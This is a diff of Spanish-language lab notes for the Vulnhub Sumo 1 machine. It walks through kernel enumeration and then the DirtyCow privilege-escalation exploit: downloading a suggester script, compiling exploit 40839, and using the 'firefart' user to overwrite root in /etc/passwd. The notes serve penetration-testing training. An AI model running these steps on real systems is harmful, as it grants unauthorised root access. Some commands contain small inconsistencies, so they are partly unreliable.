@@ -16,41 +16,62 @@ A continuación, se os comparte el enlace a la máquina Sumo 1 de Vulnhub, la cu
 
 - **Máquina Sumo 1**: [https://www.vulnhub.com/entry/sumo-1,480/](https://www.vulnhub.com/entry/sumo-1,480/)
 
-
 ## Kernel
 
-* [Linux-Exploit-Suggester](https://github.com/The-Z-Labs/linux-exploit-suggester)   Este exploit esta enfocado a la explotación del Kernel.
+[Linux Suggester](https://github.com/The-Z-Labs/linux-exploit-suggester)
 
-```bash
+```bash 
+# Descargar 'Linux Suggester' 
+❯ wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh 
+```
+
+```bash 
+❯ lse.sh -l 1 -i    # Enumeramos con la herramienta   
+```
+
+## DirtyCow2
+
+* [DirtyCow2](https://www.exploit-db.com/exploits/40839)
+
+```bash 
+❯ apt install gcc                          # Instalar el GCC
+```
+
+```bash 
+# Se puede usar en el Kernel 2.6.22 < 3.9
+❯ gcc -pthread dirty.c -o dirty -lcrypt     # compilar el binario y nos regresa un nuevo archivo llamado 'dirty'
+❯ chmod +x dirty 
+❯ ./dirty <passwd>                          # Ejecutamos el binario y le colocamos la passwd que queramos
+
+# Este binario nos va a crear un usuario llamado 'firefart' y lo reemplazara en el usuario 'root' 
+
+❯ su firefart                               # Colocamos la passwd que ingresamos al momento de ejecutarlo y ahora seremos root
+❯ ssh firefart@<IP>                         # Tambien podemos ingresar por SSH
+	❯ ssh-keygen -f "/homekali/.ssh/known_hosts" -R "<IP>" # Si nos da un problema al momento de ingresar por SSH, colocamos ese 
+```
+
+```bash 
+❯ sysinfo             # Nos muestra informacion de Linux, asi como la version del Kernel 
+❯ getuid              # Nos muestra el username del servidor 
+
 ❯ lsb_release -a                                               
-❯ uname -a                                       # Para ver la Version e informacion del Kernel 
+❯ uname -a            # Para ver la Version e informacion del Kernel 
 
-# 3.2.0-23 Version antigua de Kernel (Explotable)
+Nota: La versión antigua de 'Kernel 3.2.0-23' es explotable
+
 ```
-
-```bash 
-❯ searchsploit kernel 3.2                        # Nos muestra si la version del Kernel se puede explotar, ademas de salir Dirty Cow
-❯ searchsploit dirty cow                         # Buscaremos la que sobre-escribe el /etc/passwd y es un script en 'c' y se acontece una 'race condition privilege escalation'
-```
-
-Nos transferimos el script en c
-```bash 
-❯ searchsploit -m linux/local/40839.c            # Movemos el exploit a nuestra maquina de atacante 
-# El binario lo debemos de compilar en la maquina victima, pero si no nos deja lo tendremos que hacer en la nuestra y despues pasar el binario a la maquina victima 
-❯ gcc -pthread 40839.c -o dirty -lcrypt          # Para compilar el binario en la maquina victima, dirty = nombre del archivo final ejecutable
-```
-
-Lo que hace este exploit es que por medio de la vulnerabilidad de 'race condition' crea un nuevo usuario hasta arriba del '/etc/passwd' y sustituye root por otro usuario llamado 'firefart' y la passwd es la que tu le indicas al script al momento de ejecutarlo.
 
 ```python 
+# Lo que hace este exploit es que por medio de la vulnerabilidad de 'race condition' crea un nuevo usuario hasta arriba del '/etc/passwd' y sustituye root por otro usuario llamado 'firefart' y la passwd es la que tu le indicas al script al momento de ejecutarlo.
+
 ❯ cat /etc/passwd
 
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
-```
 
-Nota: A veces tarda un poco en que te regrese la consola. 
+# Nota: A veces tarda un poco en que te regrese la consola. 
+```
 
 ```python 
 ❯ cat /etc/passwd
@@ -65,9 +86,4 @@ bin:x:2:2:bin:/bin:/usr/sbin/nologin
 ❯ su firefart                     # Cambiamos de usuario y le colocamos la passwd que colocamos en el script
 ❯ whoami                          # Nos muestra que somos el usuario firefart
 ❯ id                              # Miramos que el id = 0, o sea que somos root 
-```
-
-Otras formas de explotar el Kernel 
-```bash 
-❯ searchsploit kernel privilege escalation     # Nos mostrara scripts para poder explotar el kernel
 ```
